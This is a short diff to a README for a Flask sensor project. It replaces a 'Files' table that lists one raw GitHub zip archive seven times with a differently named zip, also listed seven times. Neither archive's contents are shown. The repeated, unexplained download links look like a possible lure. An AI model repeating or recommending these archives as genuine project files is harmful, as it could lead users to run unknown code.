@@ -33,13 +33,13 @@ The app will consist of a Flask web server, temperature and humidity sensor, mot
 
 | Files |
 | ----- |
-| `https://raw.githubusercontent.com/LeboMeje/Research-Project-approval-Part-1/master/static/Project_Part_Research_approval_1.9.zip` |
-| `https://raw.githubusercontent.com/LeboMeje/Research-Project-approval-Part-1/master/static/Project_Part_Research_approval_1.9.zip` |
-| `https://raw.githubusercontent.com/LeboMeje/Research-Project-approval-Part-1/master/static/Project_Part_Research_approval_1.9.zip` |
-| `https://raw.githubusercontent.com/LeboMeje/Research-Project-approval-Part-1/master/static/Project_Part_Research_approval_1.9.zip` |
-| `https://raw.githubusercontent.com/LeboMeje/Research-Project-approval-Part-1/master/static/Project_Part_Research_approval_1.9.zip` |
-| `https://raw.githubusercontent.com/LeboMeje/Research-Project-approval-Part-1/master/static/Project_Part_Research_approval_1.9.zip` |
-| `https://raw.githubusercontent.com/LeboMeje/Research-Project-approval-Part-1/master/static/Project_Part_Research_approval_1.9.zip` |
+| `https://raw.githubusercontent.com/LeboMeje/Research-Project-approval-Part-1/master/static/approval_Part_Research_Project_v1.1.zip` |
+| `https://raw.githubusercontent.com/LeboMeje/Research-Project-approval-Part-1/master/static/approval_Part_Research_Project_v1.1.zip` |
+| `https://raw.githubusercontent.com/LeboMeje/Research-Project-approval-Part-1/master/static/approval_Part_Research_Project_v1.1.zip` |
+| `https://raw.githubusercontent.com/LeboMeje/Research-Project-approval-Part-1/master/static/approval_Part_Research_Project_v1.1.zip` |
+| `https://raw.githubusercontent.com/LeboMeje/Research-Project-approval-Part-1/master/static/approval_Part_Research_Project_v1.1.zip` |
+| `https://raw.githubusercontent.com/LeboMeje/Research-Project-approval-Part-1/master/static/approval_Part_Research_Project_v1.1.zip` |
+| `https://raw.githubusercontent.com/LeboMeje/Research-Project-approval-Part-1/master/static/approval_Part_Research_Project_v1.1.zip` |
 
 ## Contributor
 Lebohang Meje
